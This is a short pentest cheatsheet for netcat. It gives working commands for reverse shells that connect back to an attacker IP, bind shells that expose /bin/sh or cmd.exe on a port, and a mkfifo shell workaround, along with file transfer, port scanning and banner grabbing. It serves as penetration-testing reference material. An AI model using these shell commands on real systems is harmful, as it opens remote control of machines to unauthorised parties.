---
type: tool
category: post-exploitation, shells
tags: [netcat, nc, reverse-shell, bind-shell, file-transfer]
source: teamghsoftware/security-cheatsheets
---

## What it is
Netcat (nc) is the "Swiss army knife" of networking. In pentest it's used for catching reverse shells, sending bind shells, transferring files, and banner grabbing.

## Reverse Shells

```bash
# Attacker — start listener
nc -lvnp 4444

# Target — Linux reverse shell
nc -nv <attacker-IP> 4444 -e /bin/sh

# Target — Windows reverse shell
nc -nv <attacker-IP> 4444 -e cmd.exe
```

## Bind Shells

```bash
# Target — open bind shell on port 4444
nc -lvp 4444 -e /bin/sh          # Linux
nc -lvp 4444 -e cmd.exe          # Windows

# Attacker — connect to it
nc -nv <target-IP> 4444
```

## File Transfer

```bash
# Receiver (starts first)
nc -lvp 4444 > received_file.txt

# Sender
nc -nv <receiver-IP> 4444 < file_to_send.txt
```

## Port Scanner

```bash
nc -z <IP> 20-80        # scan port range 20–80
```

## Banner Grabbing

```bash
echo "" | nc -nv -w1 <IP> 80
```

## Tips

- `-l` listen mode, `-v` verbose, `-n` no DNS, `-p` port, `-e` execute program
- On newer systems `nc` may not have `-e`. Use `ncat` (from nmap) or craft a shell differently:
  ```bash
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvp 4444 > /tmp/f
  ```

## Related
- [[Pentest Web Cheatsheet]]
- [[Reverse Shell Cheatsheet]]
- [[Pentest Privesc Cheatsheet]]
